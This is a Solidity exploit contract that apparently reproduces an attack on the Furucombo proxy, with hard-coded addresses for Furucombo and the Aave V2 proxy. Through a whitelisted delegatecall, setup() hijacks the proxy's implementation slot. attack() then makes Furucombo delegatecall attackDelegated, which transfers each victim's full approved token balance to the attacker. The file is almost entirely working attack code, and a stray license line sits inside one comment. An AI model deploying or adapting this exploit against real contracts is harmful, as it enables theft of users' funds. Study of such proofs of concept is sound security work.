// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;
import "console.sol";
import "IERC20.sol";
import "./Proxy.sol";

contract Attacker {
    IProxy public constant furucombo =
        IProxy(0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f);
    IAaveV2Proxy public constant aaveV2Proxy =
        IAaveV2Proxy(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    function setup() external payable {
        address[] memory tos = new address[](1);
        bytes32[] memory configs = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);
        // aaveV2Proxy is whitelisted and passes registry._isValid(aaveV2Proxy)
        // then delegatecalls to aaveV2Proxy.initialize(this, "");
        // which stores implementation address
        tos[0] = address(aaveV2Proxy);
        datas[0] = abi.encodeWithSelector(
            aaveV2Proxy.initialize.selector,
            address(this),
            ""
        );
        furucombo.batchExec(tos, configs, datas);
    }

    function attack(IERC20 token, address sender) external payable {
        address[] memory tos = new address[](1);
        bytes32[] memory configs = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);
        tos[0] = address(aaveV2Proxy);
        datas[0] = abi.encodeWithSelector(
            this.attackDelegated.selector,
            token,
            sender
        );
        // aaveV2Proxy is whitelisted and passes registry._isValid(aaveV2Proxy)
        // then delegatecalls to aaveV2Proxy.fallback
        // which delegatecalls again to its implementation address
        // which was changed in setup to "this"
       // SPDX-License-Identifier: UNLICENSED
        // meaning furucombo delegatecalls to this.attackDelegated
        furucombo.batchExec(tos, configs, datas);
    }

    function attackDelegated(IERC20 token, address sender) external payable {
        token.transferFrom(sender, tx.origin, token.balanceOf(sender));
    }
}